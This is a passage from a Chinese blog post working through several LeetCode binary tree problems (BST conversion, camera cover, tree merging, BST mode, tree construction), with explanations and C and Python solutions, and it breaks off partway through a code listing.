反序中序遍历</h4><p>由于二叉查找树的这个特性，我们考虑<strong>递归实现的深度优先搜索</strong>算法，通过<strong>反序中序遍历</strong>来实现，过程如下：</p><ul><li><strong>遍历右子树，将右子树结点值加到summary</strong></li><li><strong>将当前结点值加到summary</strong></li><li><strong>将当前结点值置为summary</strong></li><li><strong>遍历左子树</strong></li></ul><p>每个结点需要一个额外的栈空间，因而空间复杂度为<strong>O</strong>(<strong>N</strong>)；需要遍历每个结点一次，因而时间复杂度为<strong>O</strong>(<strong>N</strong>)</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(struct TreeNode* root, <span class="keyword">int</span> *sum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    dfs(root-&gt;right,sum);</span><br><span class="line">    *sum+=root-&gt;val;</span><br><span class="line">    root-&gt;val=*sum;</span><br><span class="line">    dfs(root-&gt;left,sum);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct TreeNode* <span class="title">convertBST</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    dfs(root, &amp;sum);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/21/hJQADZUcMlypLYn.png" alt="image.png"></p><h3 id="22-968-监控二叉树（困难）"><a href="#22-968-监控二叉树（困难）" class="headerlink" title="22 - 968. 监控二叉树（困难）"></a>22 - <a href="https://leetcode-cn.com/problems/binary-tree-cameras/" target="_blank" rel="noopener">968. 监控二叉树（困难）</a></h3><blockquote><p>给定一个二叉树，我们在树的节点上安装摄像头。</p><p>节点上的每个摄影头都可以监视其父对象、自身及其直接子对象。</p><p>计算监控树的所有节点所需的最小摄像头数量。</p><p>示例 1：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/bst_cameras_01.png" alt="image.png"></p><p>输入：[0,0,null,0,0]<br>输出：1<br>解释：如图所示，一台摄像头足以监控所有节点。<br>示例 2：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/bst_cameras_02.png" alt="image.png"></p><p>输入：[0,0,null,0,null,0,null,null,0]<br>输出：2<br>解释：需要至少两个摄像头来监视树的所有节点。 上图显示了摄像头放置的有效位置之一。</p><p>提示：</p><p>给定树的节点数的范围是 [1, 1000]。<br>每个节点的值都是 0。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/binary-tree-cameras" target="_blank" rel="noopener">https://leetcode-cn.com/problems/binary-tree-cameras</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p><del>又是hard，真有你的啊leetcode</del></p><p>仔细想想，对于一个结点是否需要安装摄像头，其实是<strong>由其子树的状态来决定的</strong>，那么我们可以使用<strong>动态规划算法</strong></p><h4 id="解法：递归-深度优先搜索（DFS）-动态规划（DP）"><a href="#解法：递归-深度优先搜索（DFS）-动态规划（DP）" class="headerlink" title="解法：递归 + 深度优先搜索（DFS） + 动态规划（DP）"></a>解法：递归 + 深度优先搜索（DFS） + 动态规划（DP）</h4><p>大概如下图所示：<br><img src="https://i.loli.net/2020/09/22/5v4sz9fdl2OLau7.png" alt="image.png"></p><p>我们考虑有以下几种情况：</p><ul><li><strong>当一个结点的左或右子树没有被摄像头覆盖上时，这个结点必须要安装一个摄像头来监测其左或右子树，定义为状态码STATUS_CAMERA</strong></li><li><strong>当一个结点的左右子树都已经被摄像头覆盖上时，为了实现摄像头数量的最小化，需要在该结点的父结点放置摄像头，即在回到父结点前该结点都是未被覆盖的，定义为状态码STATUS_UNCOVERED</strong></li><li><strong>当一个结点的左右子树中存在摄像头，则该结点肯定是被覆盖了的，定义为状态码STATUS_COVERED</strong></li><li><strong>对于结点为NULL的情况，我们可以默认他是被覆盖了的结点，即定义为状态码STATUS_COVERED</strong></li></ul><p>同时，<strong>我们还需要对这棵树的根节点做一次单独的检测，以确定是否要在其上放置摄像头</strong></p><p>为了方便判定，我们将STATUS_CAMERA设置为状态码中值相对大的一个</p><h4 id="状态转移方程"><a href="#状态转移方程" class="headerlink" title="状态转移方程"></a>状态转移方程</h4><p><strong>STATUS_ROOT = F(STATUS_LEFT, STATUS_RIGHT)</strong></p><h4 id="时间复杂度："><a href="#时间复杂度：" class="headerlink" title="时间复杂度："></a>时间复杂度：</h4><p>n次遍历，线性时间复杂度<strong>O</strong>(<strong>N</strong>)</p><h4 id="空间复杂度："><a href="#空间复杂度：" class="headerlink" title="空间复杂度："></a>空间复杂度：</h4><p>递归算法要开辟n个栈空间，故为线性空间复杂度<strong>O</strong>(<strong>N</strong>)</p><p>构造代码如下：</p><h4 id="C语言版"><a href="#C语言版" class="headerlink" title="C语言版"></a>C语言版</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * status code</span></span><br><span class="line"><span class="comment"> * 0: waiting for pwn</span></span><br><span class="line"><span class="comment"> * 1: has been pwn</span></span><br><span class="line"><span class="comment"> * 2: camara here</span></span><br><span class="line"><span class="comment"> *-1: inner error, just a placeholder in fact</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_UNCOVERED 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_COVERED 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_CAMERA 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_ERROR -1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">minCameraCover</span><span class="params">(struct TreeNode* root)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> amounts=<span class="number">0</span>;<span class="comment">//amounts of camera</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//add a camera to the root if status of root is 0</span></span><br><span class="line">    <span class="keyword">if</span>(dfs(root,&amp;amounts) == STATUS_UNCOVERED)</span><br><span class="line">        amounts++;</span><br><span class="line">    <span class="keyword">return</span> amounts;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(struct TreeNode* root, <span class="keyword">int</span> * amounts)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//NULL pointer signed as status 1</span></span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> STATUS_COVERED;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get the status of left and right node</span></span><br><span class="line">    <span class="keyword">int</span> left = dfs(root-&gt;left, amounts);</span><br><span class="line">    <span class="keyword">int</span> right = dfs(root-&gt;right, amounts);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//if one of both uncovered yet, a camera is needed</span></span><br><span class="line">    <span class="keyword">if</span>(left == STATUS_UNCOVERED || right == STATUS_UNCOVERED)</span><br><span class="line">    &#123;</span><br><span class="line">        (*amounts)++;</span><br><span class="line">        <span class="keyword">return</span> STATUS_CAMERA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//if both are covered, father's of root may need a camera</span></span><br><span class="line">    <span class="keyword">if</span>(left == STATUS_COVERED &amp;&amp; right == STATUS_COVERED)</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNCOVERED;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//if there's at least one camera in both childs, the root is covered</span></span><br><span class="line">    <span class="keyword">if</span>(left + right &gt; STATUS_CAMERA)</span><br><span class="line">        <span class="keyword">return</span> STATUS_COVERED;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//error code(not used)</span></span><br><span class="line">    <span class="keyword">return</span> STATUS_ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/22/64ytrK3gLNGowbf.png" alt="EE8895_CCLKZDA_OPW4_FT1.png"></p><h4 id="Python语言版："><a href="#Python语言版：" class="headerlink" title="Python语言版："></a>Python语言版：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  status</span></span><br><span class="line"><span class="comment">#  0 - waiting for pwn</span></span><br><span class="line"><span class="comment">#  1 - has been pwn</span></span><br><span class="line"><span class="comment">#  2 - camera here</span></span><br><span class="line"><span class="comment"># -1 - error, just a placeholder</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    amounts = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(self, root: TreeNode)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> root == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        left = self.dfs(root.left)</span><br><span class="line">        right = self.dfs(root.right)</span><br><span class="line">        <span class="keyword">if</span> left == <span class="number">1</span> <span class="keyword">and</span> right == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> left == <span class="number">0</span> <span class="keyword">or</span> right == <span class="number">0</span>:</span><br><span class="line">            self.amounts += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> left + right &gt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minCameraCover</span><span class="params">(self, root: TreeNode)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> self.dfs(root) == <span class="number">0</span>:</span><br><span class="line">            self.amounts += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> self.amounts</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/22/2tbv6R7LizECw3e.png" alt="image.png"></p><h3 id="23-617-合并二叉树（简单）"><a href="#23-617-合并二叉树（简单）" class="headerlink" title="23 - 617. 合并二叉树（简单）"></a>23 - <a href="https://leetcode-cn.com/problems/merge-two-binary-trees/" target="_blank" rel="noopener">617. 合并二叉树（简单）</a></h3><blockquote><p>给定两个二叉树，想象当你将它们中的一个覆盖到另一个上时，两个二叉树的一些节点便会重叠。</p><p>你需要将他们合并为一个新的二叉树。合并的规则是如果两个节点重叠，那么将他们的值相加作为节点合并后的新值，否则不为 NULL 的节点将直接作为新二叉树的节点。</p><p>示例 1:</p><p>输入:<br>    Tree 1                     Tree 2<br>          1                         2<br>         / \                       / \<br>        3   2                     1   3<br>       /                             \   \<br>      5                             4   7<br>输出:<br>合并后的树:<br>         3<br>        / \<br>       4   5<br>      / \   \<br>     5   4   7<br>注意: 合并必须从两个树的根节点开始。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/merge-two-binary-trees" target="_blank" rel="noopener">https://leetcode-cn.com/problems/merge-two-binary-trees</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>很简单的一道题，<del>3分钟不到就做出来了，今晚可以做个好梦了</del>（<del>确信</del></p><h4 id="解法：递归-深度优先搜索（DFS）"><a href="#解法：递归-深度优先搜索（DFS）" class="headerlink" title="解法：递归 + 深度优先搜索（DFS）"></a>解法：递归 + 深度优先搜索（DFS）</h4><p>逐层递归，合并到t1上：</p><ul><li><strong>t1、t2若为空则直接返回其中非空的那一个</strong></li><li><strong>将t2的val加到t1的val上</strong></li><li><strong>合并t1左与t2左</strong></li><li><strong>合并t1右与t2右</strong></li></ul><p>得到代码如下：</p><h4 id="时间复杂度：-1"><a href="#时间复杂度：-1" class="headerlink" title="时间复杂度："></a>时间复杂度：</h4><p>搜索的次数和结点数量线性增长，故时间复杂度为<strong>O</strong>(<strong>N</strong>)</p><h4 id="空间复杂度：-1"><a href="#空间复杂度：-1" class="headerlink" title="空间复杂度："></a>空间复杂度：</h4><p>需要的栈空间数量和结点数量线性增长，故空间复杂度为<strong>O</strong>(<strong>N</strong>)</p><h4 id="C语言版："><a href="#C语言版：" class="headerlink" title="C语言版："></a>C语言版：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct TreeNode* <span class="title">mergeTrees</span><span class="params">(struct TreeNode* t1, struct TreeNode* t2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!t1)</span><br><span class="line">        <span class="keyword">return</span> t2;</span><br><span class="line">    <span class="keyword">if</span>(!t2)</span><br><span class="line">        <span class="keyword">return</span> t1;</span><br><span class="line">    t1-&gt;val += t2-&gt;val;</span><br><span class="line">    t1-&gt;left = mergeTrees(t1-&gt;left,t2-&gt;left);</span><br><span class="line">    t1-&gt;right = mergeTrees(t1-&gt;right,t2-&gt;right);</span><br><span class="line">    <span class="keyword">return</span> t1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXgivj.png" alt="wXgivj.png"></p><h4 id="Python语言版：-1"><a href="#Python语言版：-1" class="headerlink" title="Python语言版："></a>Python语言版：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mergeTrees</span><span class="params">(self, t1: TreeNode, t2: TreeNode)</span> -&gt; TreeNode:</span></span><br><span class="line">        <span class="keyword">if</span> t1 == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> t2</span><br><span class="line">        <span class="keyword">if</span> t2 == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> t1</span><br><span class="line">        t1.val += t2.val</span><br><span class="line">        t1.left = self.mergeTrees(t1.left, t2.left)</span><br><span class="line">        t1.right = self.mergeTrees(t1.right, t2.right)</span><br><span class="line">        <span class="keyword">return</span> t1</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXgJVx.png" alt="wXgJVx.png"></p><h3 id="24-501-二叉搜索树中的众数（简单）"><a href="#24-501-二叉搜索树中的众数（简单）" class="headerlink" title="24 - 501. 二叉搜索树中的众数（简单）"></a>24 - <a href="https://leetcode-cn.com/problems/find-mode-in-binary-search-tree/" target="_blank" rel="noopener">501. 二叉搜索树中的众数（简单）</a></h3><blockquote><p>给定一个有相同值的二叉搜索树（BST），找出 BST 中的所有众数（出现频率最高的元素）。</p><p>假定 BST 有如下定义：</p><p>结点左子树中所含结点的值小于等于当前结点的值<br>结点右子树中所含结点的值大于等于当前结点的值<br>左子树和右子树都是二叉搜索树<br>例如：<br>给定 BST [1,null,2,2],</p><p>   1<br>    \<br>     2<br>    /<br>   2<br>返回[2].</p><p>提示：如果众数超过1个，不需考虑输出顺序</p><p>进阶：你可以不使用额外的空间吗？（假设由递归产生的隐式调用栈的开销不被计算在内）</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/find-mode-in-binary-search-tree" target="_blank" rel="noopener">https://leetcode-cn.com/problems/find-mode-in-binary-search-tree</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h4 id="解法：递归-深度优先搜索（DFS）-1"><a href="#解法：递归-深度优先搜索（DFS）-1" class="headerlink" title="解法：递归 + 深度优先搜索（DFS）"></a>解法：递归 + 深度优先搜索（DFS）</h4><p>考虑到二叉搜索树中<strong>左子树所有结点的值小于当前结点值小于右子树所有结点的值</strong>，故还是采取<strong>深度优先搜索算法</strong></p><p>递归中序遍历，由于二叉搜索树的特殊性质，我们遍历的顺序一定是<strong>排序好的</strong></p><p>故构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">max</span>;<span class="comment">//数量最多的数的数量</span></span><br><span class="line"><span class="keyword">int</span> num;<span class="comment">//前一结点的连续结点个数</span></span><br><span class="line"><span class="keyword">int</span> pre;<span class="comment">//前一结点的值</span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">size</span>;<span class="comment">//返回的数组的大小</span></span><br><span class="line"><span class="keyword">int</span> *retn;<span class="comment">//返回的数组</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">findMode</span><span class="params">(struct TreeNode* root, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    retn = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">2150</span>);</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">    &#123;</span><br><span class="line">        *returnSize = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> retn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">0</span>;</span><br><span class="line">    pre = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="built_in">size</span> = <span class="number">0</span>;</span><br><span class="line">    num = <span class="number">0</span>;</span><br><span class="line">    dfs(root);</span><br><span class="line">    *returnSize = <span class="built_in">size</span>;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(struct TreeNode * root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    dfs(root-&gt;left);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(root-&gt;val == pre)</span><br><span class="line">        num++;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//新序列</span></span><br><span class="line">        num = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(num &gt; <span class="built_in">max</span>)<span class="comment">//相同结点数量比max还多，则进行重置</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">size</span> = <span class="number">0</span>;</span><br><span class="line">        retn[<span class="built_in">size</span>++] = root-&gt;val;</span><br><span class="line">        <span class="built_in">max</span> = num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(num == <span class="built_in">max</span>)<span class="comment">//否则，放入数组中</span></span><br><span class="line">    &#123;</span><br><span class="line">        retn[<span class="built_in">size</span>++] = root-&gt;val;        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pre = root-&gt;val;<span class="comment">//储存该结点值，继续遍历下一结点</span></span><br><span class="line"></span><br><span class="line">    dfs(root-&gt;right);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/24/wxTxSA.png" alt="wxTxSA.png"></p><h3 id="25-106-从中序与后序遍历序列构造二叉树（中等）"><a href="#25-106-从中序与后序遍历序列构造二叉树（中等）" class="headerlink" title="25 - 106. 从中序与后序遍历序列构造二叉树（中等）"></a>25 - <a href="https://leetcode-cn.com/problems/construct-binary-tree-from-inorder-and-postorder-traversal/" target="_blank" rel="noopener">106. 从中序与后序遍历序列构造二叉树（中等）</a></h3><blockquote><p>根据一棵树的中序遍历与后序遍历构造二叉树。</p><p>注意:<br>你可以假设树中没有重复的元素。</p><p>例如，给出</p><p>中序遍历 inorder = [9,3,15,20,7]<br>后序遍历 postorder = [9,15,7,20,3]<br>返回如下的二叉树：</p><pre><code>  3 / \\9  20  /  \\ 15   7</code></pre><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/construct-binary-tree-from-inorder-and-postorder-traversal" target="_blank" rel="noopener">https://leetcode-cn.com/problems/construct-binary-tree-from-inorder-and-postorder-traversal</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p><del>一上来就把我给看懵了，真有你的啊leetcode</del></p><h4 id="解法：递归"><a href="#解法：递归" class="headerlink" title="解法：递归"></a>解法：递归</h4><p>这道题主要的突破点是<strong>后序遍历所得的数组</strong></p><p>中序遍历的顺序是：<strong>根-&gt;左-&gt;右</strong></p><p>后序遍历的顺序是：<strong>左-&gt;右-&gt;根</strong></p><p>也就是说，<strong>后序遍历的最后一个结点必定是这一棵树的根结点，而中序遍历所得的结果中根结点的左边所有结点必定属于左子树，右边所有结点必定属于右子树</strong></p><p><strong>在后序列表中，前left个值为左子树，left+1到left+right为右子树；</strong><br><strong>在中序列表中，根结点前为左子树，根结点后为右子树；</strong> </p><p>依照这个性质，我们便可以<strong>按照中序遍历的顺序重构这一棵树</strong></p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 